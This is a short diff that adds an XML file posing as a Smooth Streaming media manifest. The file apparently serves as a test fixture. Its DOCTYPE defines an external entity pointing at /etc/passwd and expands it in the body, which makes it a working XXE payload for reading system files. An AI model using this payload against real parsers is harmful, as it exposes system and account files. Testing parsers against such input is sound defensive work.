@@ -1,0 +1,6 @@
+<!DOCTYPE SmoothStreamingMedia [
+  <!ENTITY external SYSTEM "file:///etc/passwd">
+]>
+<SmoothStreamingMedia MajorVersion="2" MinorVersion="0" Duration="10000000">
+  &external;
+</SmoothStreamingMedia>
